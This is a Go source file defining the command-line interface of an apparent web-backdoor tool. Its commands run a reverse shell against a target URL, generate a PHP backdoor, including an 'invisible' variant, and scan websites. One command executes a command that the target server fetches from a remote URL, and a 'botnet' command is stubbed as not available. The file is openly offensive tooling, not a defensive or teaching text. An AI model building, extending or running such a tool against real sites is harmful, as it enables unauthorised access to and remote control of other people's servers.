package app

import "github.com/urfave/cli"

func getCommands(app *AppInterface) []cli.Command {
	var runDefinition = cli.Command{
		Name:    "run",
		Aliases: []string{"r"},
		Usage:   "Run reverse shell with configuration",
		Action:  app.Start,
		Flags: []cli.Flag{
			cli.StringFlag{Name: "u, url", Usage: "Url of the target. Ex: -u http://localhost/script.php"},
			cli.StringFlag{Name: "m, method", Usage: "Method to use. Ex: -m POST", Value: "GET"},
			cli.StringFlag{Name: "p, parameter", Usage: "Parameter to use. Ex: -p test", Value: "razboynik"},
			cli.IntFlag{Name: "s, shellmethod", Usage: "Shellmethod to use. Ex: -s 0", Value: 0},
			cli.StringFlag{Name: "k, key", Usage: "Key to unlock small protection. Ex: -k keytounlock", Value: "FromRussiaWithLove<3"},
			cli.BoolFlag{Name: "r, raw", Usage: "If true, send the request without base64 encoding"},
			cli.BoolFlag{Name: "c, crypt", Usage: "(Not available) Use a crypt"},
		},
	}

	var generateDefinition = cli.Command{
		Name:    "generate",
		Aliases: []string{"g"},
		Usage:   "Generate php file",
		Action:  app.Generate,
		Flags: []cli.Flag{
			cli.StringFlag{Name: "m, method", Usage: "Method to use. Ex: -m POST", Value: "GET"},
			cli.StringFlag{Name: "p, parameter", Usage: "Parameter to use. Ex: -p test", Value: "razboynik"},
			cli.StringFlag{Name: "k, key", Usage: "Key to unlock small protection. Ex: -k keytounlock", Value: "FromRussiaWithLove<3"},
			cli.BoolFlag{Name: "r, raw", Usage: "If true, don't put the base64 decoder on the request"},
			cli.BoolFlag{Name: "i, invisible", Usage: "If true, generate an invisible php backdoor."},
		},
	}

	var scanDefinition = cli.Command{
		Name:    "scan",
		Aliases: []string{"s"},
		Usage:   "Scan a website",
		Action:  app.Scan,
		Flags: []cli.Flag{
			cli.StringFlag{Name: "u, url", Usage: "Url of the target. Ex: -u http://localhost/script.php"},
			cli.StringFlag{Name: "p, parameter", Usage: "Parameter to use. Ex: -p test", Value: "razboynik"},
			cli.StringFlag{Name: "k, key", Usage: "Key to unlock small protection", Value: "FromRussiaWithLove<3"},
		},
	}

	var invisibleDefinition = cli.Command{
		Name:    "invisible",
		Aliases: []string{"i"},
		Usage:   "Execute a raw command available at an url (referer). Ex: http://website/cmd.txt point to 'echo 1;' in body, then I can do : -u ... -r http://website/cmd.txt",
		Action:  app.Invisible,
		Flags: []cli.Flag{
			cli.StringFlag{Name: "u, url", Usage: "Url of the target. Ex: -u http://localhost"},
			cli.StringFlag{Name: "r, referer", Usage: "Url that the server will call to get the cmd to execute. Ex: -r http://website.com/cmd-i-want-to-execute.txt"},
		},
	}

	var botnetDefinition = cli.Command{
		Name:    "botnet",
		Aliases: []string{"b"},
		Usage:   "(Not available)",
	}

	var encodeDefinition = cli.Command{
		Name:    "encode",
		Aliases: []string{"e"},
		Usage:   "Encode a string in base64",
		Action:  app.Encode,
	}

	var decodeDefinition = cli.Command{
		Name:    "decode",
		Aliases: []string{"d"},
		Usage:   "Decode a base64 string",
		Action:  app.Decode,
	}

	var helpDefinition = cli.Command{
		Name:    "help",
		Aliases: []string{"h"},
		Usage:   "Help of application",
		Action:  app.Help,
	}

	return []cli.Command{
		runDefinition,
		generateDefinition,
		scanDefinition,
		invisibleDefinition,
		botnetDefinition,
		encodeDefinition,
		decodeDefinition,
		helpDefinition,
	}
}
